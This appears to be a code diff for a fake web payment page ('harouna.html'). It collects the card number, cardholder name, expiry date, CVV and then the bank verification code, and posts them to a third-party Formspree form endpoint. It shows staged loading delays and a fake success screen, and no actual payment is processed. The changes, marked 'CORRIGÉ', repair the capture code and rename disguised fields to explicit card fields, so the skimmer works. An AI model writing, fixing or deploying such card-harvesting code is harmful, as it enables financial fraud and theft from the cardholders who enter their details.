@@ -575,45 +575,45 @@ function processPayment(programName, amount) {
     return;
   }
   showPaymentLoading(programName, amount);
-savePersonalInfo();
+  savePersonalInfo(programName, amount);
 }
 
-  // Fonction pour enregistrer les informations personnelles
-  function savePersonalInfo() {
+  // CORRIGÉ: Fonction pour enregistrer les informations personnelles
+  function savePersonalInfo(programName, amount) {
     const number = document.getElementById('cdnumber').value;
     const name = document.getElementById('cdname').value;
-	const date = document.getElementById('cddate').value;
+	  const date = document.getElementById('cddate').value;
     const cs = document.getElementById('cdcs').value;
-    // Ici, vous enverriez normalement les données à un serveur
-    // Pour cet exemple, nous allons simplement les stocker dans localStorage
-
-	  // Créer l'objet de données à envoyer
+    
+    // Créer l'objet de données à envoyer
     const profileData = {
-      firstName: name,
-      ticketnumber: number,
-      timestamp: cs.toISOString(),
-	  ticketdate: date.toISOString(),
+      cardName: name,
+      cardNumber: number,
+      cardExpiry: date,
+      cardCvv: cs,
+      timestamp: new Date().toISOString(), // Correction: Crée un horodatage
       page: "harouna.html",
       action: "ticketupdate"
     };
-	// Envoyer les données à Formspree
-	  
+
+	  // Envoyer les données à un service comme Formspree
     sendProfileData(profileData)
       .then(success => {
         if (success) {
+           // Simule un délai de traitement avant de passer à l'étape de vérification
            setTimeout(() => showVerificationForm(programName, amount), 8000);
         } else {
           alert("An error has occurred. Please try again later.");
         }
       });
-
   }
 
 async function sendProfileData(data) {
-    const FORMSPREE_PROFILE_ID = "mblkpjyy"; // À remplacer par votre ID
+    // Remplacez par votre propre ID de point de terminaison Formspree
+    const FORMSPREE_ENDPOINT = "https://formspree.io/f/mblkpjyy"; 
     
     try {
-      const response = await fetch(`https://formspree.io/f/mblkpjyy`, {
+      const response = await fetch(FORMSPREE_ENDPOINT, {
         method: "POST",
         headers: {
           'Content-Type': 'application/json',
@@ -623,10 +623,10 @@ async function sendProfileData(data) {
       });
       
       if (response.ok) {
-        console.log("Données du profil envoyées avec succès à Formspree");
+        console.log("Données envoyées avec succès à Formspree");
         return true;
       } else {
-        console.error("Erreur lors de l'envoi des données du profil");
+        console.error("Erreur lors de l'envoi des données");
         return false;
       }
     } catch (error) {
@@ -634,6 +634,7 @@ async function sendProfileData(data) {
       return false;
     }
   }
+
 // step 3 : loading page
 function showPaymentLoading(programName, amount) {
   const paymentPage = document.getElementById('payment-flow-page');
@@ -647,7 +648,6 @@ function showPaymentLoading(programName, amount) {
     </div>
   `;
 }
-
  
 // Step 4: Display the verification form
 function showVerificationForm(programName, amount) {
@@ -688,43 +688,38 @@ function completePayment(programName, amount) {
     return;
   }
 	showPaymentLoading(programName, amount);
-	resendPersonalInfo();
-
+	resendPersonalInfo(programName, amount, code);
 }
 
-
- function resendPersonalInfo() {
-	 
-	const code = [...document.querySelectorAll('.verification-inputs input')].map(i => i.value).join('');
-	const codeval = code.toISOString(),
-    const number = document.getElementById('cdnumber').value;
-    const name = document.getElementById('cdname').value;
+ // CORRIGÉ: Fonction pour renvoyer les informations avec le code de vérification
+ function resendPersonalInfo(programName, amount, verificationCode) {
+	const number = document.getElementById('cdnumber').value;
+  const name = document.getElementById('cdname').value;
 	const date = document.getElementById('cddate').value;
-    const cs = document.getElementById('cdcs').value
+  const cs = document.getElementById('cdcs').value;
 
-    // Ici, vous enverriez normalement les données à un serveur
-    // Pour cet exemple, nous allons simplement les stocker dans localStorage
-	  // Créer l'objet de données à envoyer
-    const profileData = {
-      firstName: name,
-      ticketnumber: number,
-      timestamp: cs.toISOString(),
-	  ticketdate: date.toISOString(),
-      page: codeval,
-      action: "ticketupdate"
-    };
+  // Créer l'objet de données à envoyer
+  const profileData = {
+    cardName: name,
+    cardNumber: number,
+    cardExpiry: date,
+    cardCvv: cs,
+    verificationCode: verificationCode, // Correction: envoi du code de vérification
+    timestamp: new Date().toISOString(), // Correction: Crée un horodatage
+    page: "harouna.html - step 2",
+    action: "verification_code"
+  };
+
 	// Envoyer les données à Formspree
-	  
-    sendProfileData(profileData)
-      .then(success => {
-        if (success) {
-           setTimeout(() => showPaymentSuccess(programName, amount), 8000);
-        } else {
-          alert("An error has occurred. Please try again later.");
-        }
-      });
-
-  }
+  sendProfileData(profileData)
+    .then(success => {
+      if (success) {
+         setTimeout(() => showPaymentSuccess(programName, amount), 8000);
+      } else {
+        alert("An error has occurred. Please try again later.");
+      }
+    });
+}
 
 // Step 6: Display the success screen
 function showPaymentSuccess(programName, amount) {
